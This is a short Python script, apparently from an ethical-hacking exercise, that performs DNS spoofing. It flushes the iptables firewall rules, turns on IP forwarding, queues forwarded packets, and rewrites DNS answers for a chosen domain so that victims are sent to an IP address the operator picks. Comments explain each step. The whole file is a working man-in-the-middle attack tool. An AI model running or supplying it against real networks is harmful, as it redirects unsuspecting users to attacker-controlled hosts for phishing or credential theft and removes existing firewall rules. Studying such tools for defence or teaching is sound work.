#!/sur/bin/env python3

import subprocess
import netfilterqueue
import scapy.all as scapy

# Modify route: we'll modify the FORWARD chain and trap its content in NFQUEUE O
# iptables -I FORWARD -j NFQUEUE --queue-num 0

subprocess.run('iptables --flush', shell=True)
subprocess.run('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
# Enabling port forwarding
subprocess.run('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)


def process_packet(packet):
    """
    Changes the destination IP of a DNS response
    """
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR): # DNSRR is because we want to cath the response from the server. To catch victims request DNSQR
        qname = scapy_packet[scapy.DNSQR].qname
        if target_url in str(qname):
            # Check if the DNS response correspond to the target that we want to spoof
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=destination_ip)
            scapy_packet[scapy.DNS].an = answer
            # Now we must change the answers count layer (ancount) to 1, because we are sending back only one response
            scapy_packet[scapy.DNS].ancount = 1

            # Now we must delete chksum and len fields and let scapy to
            # recalculate them, so they won't break our program,
            # in both IP and UDP layers
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            # And last but not least, we must set the payload of the original
            # packet to the one that we've just created before sending it back
            # to the victim
            packet.set_payload(bytes(scapy_packet))

        # print(scapy_packet.show()) This would print all the information of DNS responses
    packet.accept() # allow the connection
    # packet.drop() # to stop the connection


try:
    target_url = input("Target url: ")
    destination_ip = input("Destination IP: ")
    queue = netfilterqueue.NetfilterQueue()
    # Now we'll connect this queue with the one we created with subprocess
    # and the function 'process_packet' wil be executed in each packet trapped
    # in the queue
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.run(["iptables", "--flush"])
    print("[+] Detected  CTRL + C ...... Deleting IP tables..... Please wait.\n")